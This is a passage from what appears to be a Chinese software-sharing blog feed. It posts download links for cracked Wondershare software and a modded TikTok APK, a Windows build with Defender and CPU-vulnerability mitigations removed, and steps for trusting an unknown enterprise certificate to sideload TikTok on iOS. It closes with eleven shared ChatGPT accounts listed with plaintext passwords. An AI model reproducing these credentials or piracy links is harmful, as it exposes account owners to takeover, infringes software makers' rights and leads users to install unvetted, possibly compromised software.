<h2 id="苹果M芯片-lx-music-desktop-1-22-3-arm64-dmg"><a href="#苹果M芯片-lx-music-desktop-1-22-3-arm64-dmg" class="headerlink" title="苹果M芯片 lx-music-desktop-1.22.3-arm64.dmg"></a>苹果M芯片 lx-music-desktop-1.22.3-arm64.dmg</h2><p><a href="https://wwm.lanzouw.com/i3B2a0h6rnfe">https://wwm.lanzouw.com/i3B2a0h6rnfe</a> 密码:4gi3</p>
<h1 id="安卓版"><a href="#安卓版" class="headerlink" title="安卓版"></a>安卓版</h1><h2 id="首选-lx-music-mobile-v0-15-0-arm64-v8a-apk"><a href="#首选-lx-music-mobile-v0-15-0-arm64-v8a-apk" class="headerlink" title="首选 lx-music-mobile-v0.15.0-arm64-v8a.apk"></a>首选 lx-music-mobile-v0.15.0-arm64-v8a.apk</h2><p><a href="https://wwm.lanzouw.com/i0sQO0h6r8yd">https://wwm.lanzouw.com/i0sQO0h6r8yd</a> 密码:bre7</p>
<h2 id="备用-lx-music-mobile-v0-15-0-universal-apk"><a href="#备用-lx-music-mobile-v0-15-0-universal-apk" class="headerlink" title="备用 lx-music-mobile-v0.15.0-universal.apk"></a>备用 lx-music-mobile-v0.15.0-universal.apk</h2><p><a href="https://wwm.lanzouw.com/iax6C0h6qurc">https://wwm.lanzouw.com/iax6C0h6qurc</a> 密码:4jp5</p>
<p><a href="https://spotube.netlify.app/">https://spotube.netlify.app/</a></p>
]]></content>
      <categories>
        <category>tools</category>
        <category>tools</category>
      </categories>
      <tags>
        <tag>tools</tag>
      </tags>
  </entry>
  <entry>
    <title>图片视频增添，去除水印工具</title>
    <url>/posts/ab4d9d67/</url>
    <content><![CDATA[<h1 id="图片去水印"><a href="#图片去水印" class="headerlink" title="图片去水印"></a>图片去水印</h1><h2 id="工具搜索引擎站点-https-bar-ssstab-com"><a href="#工具搜索引擎站点-https-bar-ssstab-com" class="headerlink" title="工具搜索引擎站点 https://bar.ssstab.com/"></a>工具搜索引擎站点 <a href="https://bar.ssstab.com/">https://bar.ssstab.com/</a></h2><h1 id="视频去水印"><a href="#视频去水印" class="headerlink" title="视频去水印"></a>视频去水印</h1><h2 id="HitPaw-Watermark-Remover-1-3-5-1-Portable-去水印-https-wwsf-lanzouw-com-i5jkY0id7z6f-密码-fv5p"><a href="#HitPaw-Watermark-Remover-1-3-5-1-Portable-去水印-https-wwsf-lanzouw-com-i5jkY0id7z6f-密码-fv5p" class="headerlink" title="HitPaw.Watermark.Remover_1.3.5.1_Portable(去水印) https://wwsf.lanzouw.com/i5jkY0id7z6f 密码:fv5p"></a>HitPaw.Watermark.Remover_1.3.5.1_Portable(去水印) <a href="https://wwsf.lanzouw.com/i5jkY0id7z6f">https://wwsf.lanzouw.com/i5jkY0id7z6f</a> 密码:fv5p</h2><p>软件基本功能 1、图片去水印 批量删除图片中的水印Logo或数码照片上的日期等，不用学习复杂的PhotoShop，也能得到想要的效果 2、视频去水印 如果你的视频中有一些不满意的瑕疵或者不需要的水印， 只需轻轻一点“转换”按钮，即可让它瞬间消失 3、选取拖拽功能 用户可自由拖拽并自定义修改区域，以去除照片或视频中的瑕疵以及水印 4、保持原始质量和格式 利用HitPaw Watermark Remover去除水印后的输出图片或者视频与原文件的质量和格式没有任何区别 5、批量删除图片&#x2F;视频水印 允许你添加任意数量的照片，换句话说，你可以批量删除多张照片中的水印以及其他多余的东西。软件对文件数量没有限制，但是文件添加越多，要求的处理时间也会增长，耐心等候一下，就能帮你将多个文件完美处理。</p>
<h2 id="万兴优转-Wondershare-UniConverter-v14-1-3-96-链接-https-pan-baidu-com-s-1eYcI-lc8vAR0RT3SIoPu7A-pwd-47dg-提取码-47dg-复制这段内容后打开百度网盘手机App，操作更方便哦"><a href="#万兴优转-Wondershare-UniConverter-v14-1-3-96-链接-https-pan-baidu-com-s-1eYcI-lc8vAR0RT3SIoPu7A-pwd-47dg-提取码-47dg-复制这段内容后打开百度网盘手机App，操作更方便哦" class="headerlink" title="万兴优转 Wondershare UniConverter v14.1.3.96 链接: https://pan.baidu.com/s/1eYcI_lc8vAR0RT3SIoPu7A?pwd=47dg 提取码: 47dg 复制这段内容后打开百度网盘手机App，操作更方便哦"></a>万兴优转 Wondershare UniConverter v14.1.3.96 链接: <a href="https://pan.baidu.com/s/1eYcI_lc8vAR0RT3SIoPu7A?pwd=47dg">https://pan.baidu.com/s/1eYcI_lc8vAR0RT3SIoPu7A?pwd=47dg</a> 提取码: 47dg 复制这段内容后打开百度网盘手机App，操作更方便哦</h2><p>特色功能 1.会员功能免登陆，第三方便携式处理，适度的精简优化 ├—输出视频无水印、高速转换、批量转换、硬件加速等功能 ├—解锁后的万兴优转会员版功能对比(uniconverter.cn&#x2F;pay) 2.预设配置：默认中文、启用高速转换及高速下载、GPU硬件加速等 3.删除组件：传输设备组件和驱动、云盘组件、升级组件、多国语言 4.无 Wondershare Helper Compact 后台依赖程序，该组件已剔除</p>
<h1 id="添加满屏桌面水印："><a href="#添加满屏桌面水印：" class="headerlink" title="添加满屏桌面水印："></a>添加满屏桌面水印：</h1><p><a href="https://www.aliyundrive.com/s/2h3SdACBpV9">https://www.aliyundrive.com/s/2h3SdACBpV9</a></p>
<h1 id="D音TikTok无水印下载站："><a href="#D音TikTok无水印下载站：" class="headerlink" title="D音TikTok无水印下载站："></a>D音TikTok无水印下载站：</h1><p><a href="https://www.tikwm.com/">https://www.tikwm.com/</a></p>
]]></content>
      <categories>
        <category>tools</category>
        <category>watermark</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>watermark</tag>
      </tags>
  </entry>
  <entry>
    <title>游戏玩家福音！win10 性能优化版</title>
    <url>/posts/b635b4bd/</url>
    <content><![CDATA[<p>一些老爷机&#x2F;低配置的电脑为了让系统运行更流畅，可能会选择一些精简版的系统版本，移除了一些组件功能啥的。</p>
<p>不过最近国外有人折腾出了一个专门针对游戏玩家的系统「AtlasOS」它基于 Win10 20H2 定制优化修改。</p>
<p>AtlasOS介绍<br>这个「AtlasOS」实际上和大多数精简版系统类似，也是删减了一些功能组件，以节省硬件资源，默认禁用幽灵和熔断系列漏洞，从而提高游戏性能。最离谱的是这个系统还上架到了 GitHub 开源项目了。</p>
<p><img src="/img/atlas/1.webp" alt="image">图片</p>
<p>安装好后，首次启动仅占用 600 MB 左右内存，系统启动的速度也非常快。根据介绍，主要精简了如下组件：</p>
<p>TPM 可信平台模块</p>
<p>Windows Defender</p>
<p>存储空间管理</p>
<p>eMMC 驱动</p>
<p>RAID 配置功能</p>
<p>Bitlocker</p>
<p>生物识别功能，包括指纹和面部识别都被删除</p>
<p>语音命令</p>
<p>还原点和系统重置功能等</p>
<p><img src="/img/atlas/2.webp" alt="image-1670750611883">图片</p>
<p>镜像大小 1.49 GB，安装好后占用磁盘空间 6.6 GB，小容量硬盘用户狂喜，再也不用担心 C 盘容易爆红了。</p>
<p><img src="/img/atlas/3.webp" alt="image-1670750623183">图片</p>
<p>安装中文语言<br>系统默认是英文语言界面的，所以需要安装中文语言包。下载语言包文件到桌面，然后打开 powershell(管理员) 模式，输入下面的命令：</p>
<figure class="highlight dos"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> desktop</span><br><span class="line">add-appxpackage <span class="number">19041</span>.cn.pack.Appx</span><br></pre></td></tr></table></figure>

<p><img src="/img/atlas/4.webp" alt="image-1670750653958">图片</p>
<p>安装好后，打开系统设置 - Language - Windows display language - 选择中文。之后注销或重新系统就是中文界面了，然后自行添加中文输入布局，修改时间市区为 UTC+8 等。</p>
<p><img src="/img/atlas/5.webp" alt="image-1670750666792">图片</p>
<ul>
<li>如果你懒得手动添加语言包的话，也可以下载网友 @9zhmke 整合的中文版镜像。</li>
</ul>
<p>总结<br>虽然「AtlasOS」精简了一些功能组件，但是经过网友测试，大多数软件、游戏、驱动都能正常安装使用，不像其它精简版系统会出现各种缺少文件。游戏性能和系统速度方面也优化的很不错，如果你的电脑主要玩游戏，又或者轻办公的话，那么这个系统值得一试。</p>
<p>下载地址<br>官方网站：<br><a href="https://atlasos.net/">https://atlasos.net</a><br>项目地址：<br><a href="https://github.com/Atlas-OS/Atlas">https://github.com/Atlas-OS/Atlas</a><br>英文版镜像：<br><a href="https://www.123pan.com/s/c8zA-qLzN3">https://www.123pan.com/s/c8zA-qLzN3</a><br>中文语言包：<br><a href="https://www.123pan.com/s/c8zA-jLzN3">https://www.123pan.com/s/c8zA-jLzN3</a><br>中文版镜像：<br><a href="https://www.123pan.com/s/c8zA-T5zN3">https://www.123pan.com/s/c8zA-T5zN3</a></p>
<p>注：语言包和中文镜像来源：蓝点网、无忧启动</p>
]]></content>
      <categories>
        <category>os</category>
        <category>windows</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>非侵入式和侵入式 openwrt 旁路由设置（主路由，旁路由，客户端）</title>
    <url>/posts/5f2f48aa/</url>
    <content><![CDATA[<h1 id="主路由"><a href="#主路由" class="headerlink" title="主路由"></a>主路由</h1><p>PPPoE拨号<br>192.168.1.1<br>DHCP分配IP 192.168.1.10—250<br>DNS1 119.29.29.29<br>DNS2 182.254.116.116</p>
<h2 id="非侵入式：默认网关留空"><a href="#非侵入式：默认网关留空" class="headerlink" title="非侵入式：默认网关留空"></a>非侵入式：默认网关留空</h2><h2 id="侵入式：默认网关-192-168-1-2-终端选自动配置IP"><a href="#侵入式：默认网关-192-168-1-2-终端选自动配置IP" class="headerlink" title="侵入式：默认网关 192.168.1.2 终端选自动配置IP"></a>侵入式：默认网关 192.168.1.2 终端选自动配置IP</h2><h1 id="旁路由"><a href="#旁路由" class="headerlink" title="旁路由"></a>旁路由</h1><p>IPv4 192.168.1.2<br>子网掩码 255.255.255.0<br>IPv4网关 192.168.1.1<br>DNS服务器 192.168.1.1<br>关闭DHCP<br>禁用IPv6分配长度<br>取消使用内置的IPv6管理</p>
<h1 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h1><p>去除 启用 SYN-flood 防御<br>去除 启用FullCone-NAT<br>勾选 IP动态伪装</p>
<h1 id="终端"><a href="#终端" class="headerlink" title="终端"></a>终端</h1><p>IPv4 192.168.1.10<br>子网掩码 255.255.255.0<br>IPv4网关 192.168.1.2<br>DNS服务器 192.168.1.2</p>
]]></content>
      <categories>
        <category>os</category>
        <category>openwrt</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>openwrt</tag>
      </tags>
  </entry>
  <entry>
    <title>苹果ios免拔卡安装国际版tiktok</title>
    <url>/posts/8ece5968/</url>
    <content><![CDATA[<h1 id="iOS苹果国际版TikTok"><a href="#iOS苹果国际版TikTok" class="headerlink" title="iOS苹果国际版TikTok"></a>iOS苹果国际版TikTok</h1><p>国内在苹果iOS上使用国际版抖音TikTok，一般是拔卡和挂特殊网站环境，要么使用TikTok安装包，需要自己签名，还有就是使用圈x、小火箭等等的脚本，这些对于小白来说太复杂了 ，这个app已经把TikTok安装包签好名了，直接在线安装，打开信任证书即可使用国际版TikTok了，步骤相对简单多了，而且支持账户登录，自带无水印保存TikTok视频，只不过每次打开都有一个博主的弹窗，请忽略就好。 </p>
<h1 id="苹果iOS免拔卡使用Tiktok步骤"><a href="#苹果iOS免拔卡使用Tiktok步骤" class="headerlink" title="苹果iOS免拔卡使用Tiktok步骤"></a>苹果iOS免拔卡使用Tiktok步骤</h1><h2 id="1、首先打开国际抖音TikTok的在线安装地址，点击在线安装-国际版Tiktok在线下载安装地址：https-jiesuo-tk"><a href="#1、首先打开国际抖音TikTok的在线安装地址，点击在线安装-国际版Tiktok在线下载安装地址：https-jiesuo-tk" class="headerlink" title="1、首先打开国际抖音TikTok的在线安装地址，点击在线安装 国际版Tiktok在线下载安装地址：https://jiesuo.tk/"></a>1、首先打开国际抖音TikTok的在线安装地址，点击在线安装 国际版Tiktok在线下载安装地址：<a href="https://jiesuo.tk/">https://jiesuo.tk/</a></h2><h2 id="2、安装完，打开手机设置-通用V-N与设备管理"><a href="#2、安装完，打开手机设置-通用V-N与设备管理" class="headerlink" title="2、安装完，打开手机设置-通用V*N与设备管理"></a>2、安装完，打开手机设置-通用V*N与设备管理</h2><h2 id="3、然后找到企业级APP，点击信任证书即可使用"><a href="#3、然后找到企业级APP，点击信任证书即可使用" class="headerlink" title="3、然后找到企业级APP，点击信任证书即可使用"></a>3、然后找到企业级APP，点击信任证书即可使用</h2><h2 id="4、信任完证书，打开TikTok即可正常使用，只不过每次打开国际版抖音TikTok都有一个博主的弹窗，请忽略哈，介意的，可以自行手动对TikTok-的ipa安装包签名。"><a href="#4、信任完证书，打开TikTok即可正常使用，只不过每次打开国际版抖音TikTok都有一个博主的弹窗，请忽略哈，介意的，可以自行手动对TikTok-的ipa安装包签名。" class="headerlink" title="4、信任完证书，打开TikTok即可正常使用，只不过每次打开国际版抖音TikTok都有一个博主的弹窗，请忽略哈，介意的，可以自行手动对TikTok 的ipa安装包签名。"></a>4、信任完证书，打开TikTok即可正常使用，只不过每次打开国际版抖音TikTok都有一个博主的弹窗，请忽略哈，介意的，可以自行手动对TikTok 的ipa安装包签名。</h2>]]></content>
      <categories>
        <category>tools</category>
        <category>tiktok</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>tiktok</tag>
      </tags>
  </entry>
  <entry>
    <title>安卓最新版tiktok 抖音国际版 v27.6.3 去广告解封锁</title>
    <url>/posts/877e203/</url>
    <content><![CDATA[<h1 id="抖音国际版介绍"><a href="#抖音国际版介绍" class="headerlink" title="抖音国际版介绍"></a>抖音国际版介绍</h1><p>抖音国际版App是全球最受欢迎的短视频应用，抖音国际版TikTok（海外版）横扫全球下载量常居榜首。这是最新抖音国际版版，无视封锁和下载限制，国内免拔卡，去除了广告，下载视频无水印（TikTok去水印），可以自定义地区的国际版。 </p>
<h1 id="软件版本特点"><a href="#软件版本特点" class="headerlink" title="软件版本特点"></a>软件版本特点</h1><p>– 去所有广告、去保存视频水印<br>– 内置自定义全球区域功能向导<br>– 可以自定义视频下载保存位置<br>– 解除国家&#x2F;地区限制，无视封锁<br>– 解除所有下载限制，可以保存任何视频<br>– 重定向视频保存文件夹为TikTok&#x2F;video<br>– 解除合拍和拼接限制，移除了调试信息<br>– 添加了播放进度条，支持手机号码登陆<br>备注：TikTok插件(TikTokPlugin)是配合这个修改版用的，支持中文语言自定义设置 </p>
<h1 id="软件使用说明"><a href="#软件使用说明" class="headerlink" title="软件使用说明"></a>软件使用说明</h1><h2 id="1-国际版安装后默认是英语界面，如何切换简体中文界面？"><a href="#1-国际版安装后默认是英语界面，如何切换简体中文界面？" class="headerlink" title="1.国际版安装后默认是英语界面，如何切换简体中文界面？"></a>1.国际版安装后默认是英语界面，如何切换简体中文界面？</h2><p>Profile (我的)-设置-App Language (应用语言)-中文简体 </p>
<h2 id="2-碰到无法登陆，获取验证码提示使用太频繁该怎么解决？"><a href="#2-碰到无法登陆，获取验证码提示使用太频繁该怎么解决？" class="headerlink" title="2.碰到无法登陆，获取验证码提示使用太频繁该怎么解决？"></a>2.碰到无法登陆，获取验证码提示使用太频繁该怎么解决？</h2><p>安装 Adguard，打开设置-&gt;DNS过滤-DNS请求拦截-关闭 </p>
<h2 id="3-ARM64-v8a和ARM-v7a下载哪个？"><a href="#3-ARM64-v8a和ARM-v7a下载哪个？" class="headerlink" title="3.ARM64-v8a和ARM-v7a下载哪个？"></a>3.ARM64-v8a和ARM-v7a下载哪个？</h2><p>高版本系统手机建议下载 arm64-v8a （第8代、64位ARM处理器）版本，能够发挥手机最佳性能；低版本系统手机选择ARM-v7a，自己试试。 注：安卓编译后的签名原因，无法通过Facebook, Google账户登陆。 亲测，国内无需拔卡，可以用谷歌邮箱或国内手机号注册登陆正常使用！ 由于TikTok服务器在境外，故需自备梯子，否则打开很慢会一直加载中 </p>
<h1 id="抖音国际版下载"><a href="#抖音国际版下载" class="headerlink" title="抖音国际版下载"></a>抖音国际版下载</h1><h2 id="TikTok-27-6-3-v8a-Mod-Dmitry-apk"><a href="#TikTok-27-6-3-v8a-Mod-Dmitry-apk" class="headerlink" title="TikTok-27.6.3-v8a-Mod-Dmitry.apk"></a>TikTok-27.6.3-v8a-Mod-Dmitry.apk</h2><p>链接: <a href="https://pan.baidu.com/s/15yifJvQeC5KSJELalXb4WA?pwd=hufe">https://pan.baidu.com/s/15yifJvQeC5KSJELalXb4WA?pwd=hufe</a> 提取码: hufe 复制这段内容后打开百度网盘手机App，操作更方便哦</p>
<h2 id="TikTokPlugin-2-6-8-for-Mod-apk"><a href="#TikTokPlugin-2-6-8-for-Mod-apk" class="headerlink" title="TikTokPlugin-2.6.8-for-Mod.apk"></a>TikTokPlugin-2.6.8-for-Mod.apk</h2><p>链接: <a href="https://pan.baidu.com/s/1K5qfDkGEv3r6flYaOtaxvg?pwd=31qr">https://pan.baidu.com/s/1K5qfDkGEv3r6flYaOtaxvg?pwd=31qr</a> 提取码: 31qr 复制这段内容后打开百度网盘手机App，操作更方便哦</p>
<h2 id="历史版本"><a href="#历史版本" class="headerlink" title="历史版本"></a>历史版本</h2><p>123盘：<a href="https://www.123pan.com/s/0np9-AAw0">https://www.123pan.com/s/0np9-AAw0</a></p>
]]></content>
      <categories>
        <category>tools</category>
        <category>tiktok</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>tiktok</tag>
      </tags>
  </entry>
  <entry>
    <title>ai人工智能工具网站</title>
    <url>/posts/a89f2040/</url>
    <content><![CDATA[<h1 id="500-国内外AI工具集合网站大全"><a href="#500-国内外AI工具集合网站大全" class="headerlink" title="500+ 国内外AI工具集合网站大全"></a>500+ 国内外AI工具集合网站大全</h1><p>AI工具集导航：<a href="https://ai-bot.cn/">https://ai-bot.cn/</a></p>
<h1 id="人工智能AI工具网址集合网站"><a href="#人工智能AI工具网址集合网站" class="headerlink" title="人工智能AI工具网址集合网站"></a>人工智能AI工具网址集合网站</h1><p>地址：<a href="https://www.deepdh.com/ai">https://www.deepdh.com/ai</a></p>
<h1 id="国内外AI绘画工具合集"><a href="#国内外AI绘画工具合集" class="headerlink" title="国内外AI绘画工具合集"></a>国内外AI绘画工具合集</h1><p>地址：<a href="https://github.com/hua1995116/awesome-ai-painting">https://github.com/hua1995116/awesome-ai-painting</a></p>
<h1 id="人工智能产品的导航站"><a href="#人工智能产品的导航站" class="headerlink" title="人工智能产品的导航站"></a>人工智能产品的导航站</h1><p>Ai导航：<a href="https://www.ainavpro.com/">https://www.ainavpro.com/</a></p>
<h1 id="AI人工智能工具集合网站"><a href="#AI人工智能工具集合网站" class="headerlink" title="AI人工智能工具集合网站"></a>AI人工智能工具集合网站</h1><p>Vondy：<a href="https://www.vondy.com/explore/shubham">https://www.vondy.com/explore/shubham</a></p>
<h1 id="AI工具箱集合网站"><a href="#AI工具箱集合网站" class="headerlink" title="AI工具箱集合网站"></a>AI工具箱集合网站</h1><p>AI帮个忙：<a href="https://ai-toolbox.codefuture.top/">https://ai-toolbox.codefuture.top/</a></p>
<h1 id="AI工具导航网站地址"><a href="#AI工具导航网站地址" class="headerlink" title="AI工具导航网站地址"></a>AI工具导航网站地址</h1><p>一起用AI：<a href="https://17yongai.com/">https://17yongai.com/</a></p>
<h1 id="GPT-3应用程序使用案例网站"><a href="#GPT-3应用程序使用案例网站" class="headerlink" title="GPT-3应用程序使用案例网站"></a>GPT-3应用程序使用案例网站</h1><p>GPT-3 DEMO：<a href="https://gpt3demo.com/">https://gpt3demo.com/</a></p>
<h1 id="人工智能AI工具分享列表网站"><a href="#人工智能AI工具分享列表网站" class="headerlink" title="人工智能AI工具分享列表网站"></a>人工智能AI工具分享列表网站</h1><p>地址：<a href="https://theresanaiforthat.com/">https://theresanaiforthat.com/</a></p>
<h1 id="免费在线AI智能人声分离提取工具网站地址"><a href="#免费在线AI智能人声分离提取工具网站地址" class="headerlink" title="免费在线AI智能人声分离提取工具网站地址"></a>免费在线AI智能人声分离提取工具网站地址</h1><p>AI智能声音移除器：<a href="https://www.media.io/zh/vocal-remover.html">https://www.media.io/zh/vocal-remover.html</a></p>
<h1 id="人工智能AI工具目录"><a href="#人工智能AI工具目录" class="headerlink" title="人工智能AI工具目录"></a>人工智能AI工具目录</h1><p>Futurepedia：<a href="https://www.futurepedia.io/">https://www.futurepedia.io/</a></p>
<h1 id="人工智AI-能生成的播客网站地址"><a href="#人工智AI-能生成的播客网站地址" class="headerlink" title="人工智AI 能生成的播客网站地址"></a>人工智AI 能生成的播客网站地址</h1><p>Podcast.ai：<a href="https://podcast.ai/">https://podcast.ai/</a></p>
<h1 id="AI人脸旧照片修复工具网站"><a href="#AI人脸旧照片修复工具网站" class="headerlink" title="AI人脸旧照片修复工具网站"></a>AI人脸旧照片修复工具网站</h1><p>restorePhotos：<a href="https://www.restorephotos.io/">https://www.restorephotos.io/</a></p>
<h1 id="黑白照片上色工具网站地址"><a href="#黑白照片上色工具网站地址" class="headerlink" title="黑白照片上色工具网站地址"></a>黑白照片上色工具网站地址</h1><p>Palette：<a href="https://palette.fm/">https://palette.fm</a></p>
<h1 id="在线免费AI去水印工具地址"><a href="#在线免费AI去水印工具地址" class="headerlink" title="在线免费AI去水印工具地址"></a>在线免费AI去水印工具地址</h1><p>quququ：<a href="https://quququ.cn/">https://quququ.cn/</a></p>
<h1 id="开源图像修复工具地址"><a href="#开源图像修复工具地址" class="headerlink" title="开源图像修复工具地址"></a>开源图像修复工具地址</h1><p>Lama Cleaner：<a href="https://huggingface.co/spaces/Sanster/Lama-Cleaner-lama">https://huggingface.co/spaces/Sanster/Lama-Cleaner-lama</a></p>
<h1 id="高清AI图片去背景AI抠图工具"><a href="#高清AI图片去背景AI抠图工具" class="headerlink" title="高清AI图片去背景AI抠图工具"></a>高清AI图片去背景AI抠图工具</h1><p>PixianAI：<a href="https://pixian.ai/">https://pixian.ai/</a></p>
]]></content>
      <categories>
        <category>ai</category>
      </categories>
      <tags>
        <tag>ai</tag>
      </tags>
  </entry>
  <entry>
    <title>chatgpt 多种使用渠道</title>
    <url>/posts/f808aace/</url>
    <content><![CDATA[<h1 id="ChatGPT镜像站点"><a href="#ChatGPT镜像站点" class="headerlink" title="ChatGPT镜像站点"></a>ChatGPT镜像站点</h1><p>地址：<a href="https://github.com/xx025/carrot">https://github.com/xx025/carrot</a></p>
<h1 id="国内免翻使用ChatGPT网站"><a href="#国内免翻使用ChatGPT网站" class="headerlink" title="国内免翻使用ChatGPT网站"></a>国内免翻使用ChatGPT网站</h1><p>地址1：<a href="https://freegpt.one/">https://freegpt.one/</a><br>地址2：<a href="https://chatgpt.ddiu.me/">https://chatgpt.ddiu.me/</a><br>地址3：<a href="https://chat.binjie.site:7777/">https://chat.binjie.site:7777/</a></p>
<h1 id="OpenAI-GPT-3-API智能在线问答工具网站"><a href="#OpenAI-GPT-3-API智能在线问答工具网站" class="headerlink" title="OpenAI GPT-3 API智能在线问答工具网站"></a>OpenAI GPT-3 API智能在线问答工具网站</h1><p>Teach Anything：<a href="https://teach-anything.vercel.app/">https://teach-anything.vercel.app/</a></p>
<h1 id="ChatGPT-API接口网站"><a href="#ChatGPT-API接口网站" class="headerlink" title="ChatGPT API接口网站"></a>ChatGPT API接口网站</h1><p>ChatGPT API：<a href="https://api.aa1.cn/special/chatgpt">https://api.aa1.cn/special/chatgpt</a><br>主站：<a href="https://api.aa1.cn/">https://api.aa1.cn/</a></p>
<h1 id="ChatGPT-api免翻版官网"><a href="#ChatGPT-api免翻版官网" class="headerlink" title="ChatGPT api免翻版官网"></a>ChatGPT api免翻版官网</h1><p>ChatGPT api免翻版：<a href="http://chatgpt3.icu/">http://chatgpt3.icu/</a><br>获取openai key地址：<a href="https://platform.openai.com/account/api-keys">https://platform.openai.com/account/api-keys</a></p>
<h1 id="ChatGPT共享账号1"><a href="#ChatGPT共享账号1" class="headerlink" title="ChatGPT共享账号1"></a>ChatGPT共享账号1</h1><p>账号1：<a href="mailto:&#x76;&#105;&#99;&#x6b;&#121;&#101;&#x38;&#57;&#x40;&#x68;&#111;&#x74;&#109;&#x61;&#105;&#x6c;&#x2e;&#x63;&#111;&#x6d;">&#x76;&#105;&#99;&#x6b;&#121;&#101;&#x38;&#57;&#x40;&#x68;&#111;&#x74;&#109;&#x61;&#105;&#x6c;&#x2e;&#x63;&#111;&#x6d;</a><br>密码：LeZ25X5dwL</p>
<p>账号2：<a href="mailto:&#x65;&#x75;&#103;&#101;&#x6e;&#x69;&#101;&#x76;&#x35;&#53;&#50;&#64;&#104;&#x6f;&#x74;&#x6d;&#97;&#105;&#108;&#46;&#x63;&#x6f;&#x6d;">&#x65;&#x75;&#103;&#101;&#x6e;&#x69;&#101;&#x76;&#x35;&#53;&#50;&#64;&#104;&#x6f;&#x74;&#x6d;&#97;&#105;&#108;&#46;&#x63;&#x6f;&#x6d;</a><br>密码2：4w95MnvIvc</p>
<p>账号3：<a href="mailto:&#97;&#x79;&#97;&#x6b;&#111;&#x6e;&#101;&#119;&#x75;&#x79;&#111;&#x40;&#104;&#111;&#x74;&#109;&#x61;&#x69;&#x6c;&#46;&#x63;&#111;&#x6d;">&#97;&#x79;&#97;&#x6b;&#111;&#x6e;&#101;&#119;&#x75;&#x79;&#111;&#x40;&#104;&#111;&#x74;&#109;&#x61;&#x69;&#x6c;&#46;&#x63;&#111;&#x6d;</a><br>密码3：q8UCd2lST4</p>
<p>账号4：<a href="mailto:&#108;&#x75;&#x64;&#x6d;&#105;&#108;&#x6c;&#x61;&#x73;&#116;&#101;&#98;&#57;&#x40;&#x68;&#111;&#116;&#x6d;&#x61;&#x69;&#x6c;&#x2e;&#99;&#111;&#109;">&#108;&#x75;&#x64;&#x6d;&#105;&#108;&#x6c;&#x61;&#x73;&#116;&#101;&#98;&#57;&#x40;&#x68;&#111;&#116;&#x6d;&#x61;&#x69;&#x6c;&#x2e;&#99;&#111;&#109;</a><br>密码4：7sb54Oii8I</p>
<p>账号5：<a href="mailto:&#99;&#x68;&#x72;&#x38;&#57;&#x6b;&#117;&#x63;&#104;&#116;&#111;&#64;&#104;&#111;&#x74;&#109;&#x61;&#105;&#x6c;&#x2e;&#x63;&#x6f;&#109;">&#99;&#x68;&#x72;&#x38;&#57;&#x6b;&#117;&#x63;&#104;&#116;&#111;&#64;&#104;&#111;&#x74;&#109;&#x61;&#105;&#x6c;&#x2e;&#x63;&#x6f;&#109;</a><br>密码5：Cea7IQj5ud</p>
<p>账号6：<a href="mailto:&#101;&#109;&#x69;&#108;&#48;&#51;&#109;&#x6b;&#64;&#x68;&#111;&#116;&#x6d;&#x61;&#105;&#108;&#46;&#99;&#x6f;&#109;">&#101;&#109;&#x69;&#108;&#48;&#51;&#109;&#x6b;&#64;&#x68;&#111;&#116;&#x6d;&#x61;&#105;&#108;&#46;&#99;&#x6f;&#109;</a><br>密码6：ENC82hip2A</p>
<p>账号7：<a href="mailto:&#108;&#x79;&#100;&#x69;&#97;&#x76;&#x6e;&#x39;&#x6b;&#116;&#117;&#x74;&#x6f;&#x6b;&#121;&#x40;&#x68;&#x6f;&#116;&#109;&#97;&#105;&#x6c;&#46;&#99;&#x6f;&#109;">&#108;&#x79;&#100;&#x69;&#97;&#x76;&#x6e;&#x39;&#x6b;&#116;&#117;&#x74;&#x6f;&#x6b;&#121;&#x40;&#x68;&#x6f;&#116;&#109;&#97;&#105;&#x6c;&#46;&#99;&#x6f;&#109;</a><br>密码7：6351VsZz25</p>
<p>账号8：<a href="mailto:&#x74;&#x75;&#108;&#x61;&#103;&#106;&#51;&#64;&#104;&#111;&#x74;&#x6d;&#x61;&#x69;&#x6c;&#46;&#x63;&#x6f;&#x6d;">&#x74;&#x75;&#108;&#x61;&#103;&#106;&#51;&#64;&#104;&#111;&#x74;&#x6d;&#x61;&#x69;&#x6c;&#46;&#x63;&#x6f;&#x6d;</a><br>密码8：Wx99eCqer7</p>
<p>账号9：<a href="mailto:&#x70;&#x72;&#x75;&#101;&#x35;&#x36;&#122;&#106;&#101;&#104;&#x6c;&#x65;&#x40;&#x68;&#x6f;&#116;&#x6d;&#97;&#x69;&#108;&#46;&#x63;&#111;&#x6d;">&#x70;&#x72;&#x75;&#101;&#x35;&#x36;&#122;&#106;&#101;&#104;&#x6c;&#x65;&#x40;&#x68;&#x6f;&#116;&#x6d;&#97;&#x69;&#108;&#46;&#x63;&#111;&#x6d;</a><br>密码9：8398k84X85</p>
<p>账号10：<a href="mailto:&#x76;&#101;&#x72;&#110;&#x69;&#x74;&#97;&#103;&#113;&#50;&#64;&#x68;&#x6f;&#116;&#x6d;&#97;&#105;&#108;&#46;&#99;&#111;&#109;">&#x76;&#101;&#x72;&#110;&#x69;&#x74;&#97;&#103;&#113;&#50;&#64;&#x68;&#x6f;&#116;&#x6d;&#97;&#105;&#108;&#46;&#99;&#111;&#109;</a><br>密码10：geFfr4H0x9</p>
<p>账号11：<a href="mailto:&#107;&#x69;&#x72;&#x73;&#116;&#105;&#x65;&#97;&#108;&#116;&#113;&#119;&#x40;&#104;&#x6f;&#x74;&#109;&#97;&#105;&#108;&#x2e;&#99;&#x6f;&#109;">&#107;&#x69;&#x72;&#x73;&#116;&#105;&#x65;&#97;&#108;&#116;&#113;&#119;&#x40;&#104;&#x6f;&#x74;&#109;&#97;&#105;&#108;&#x2e;&#99;&#x6f;&#109;</a><br>密码11：1FBbV8OJg9</p>
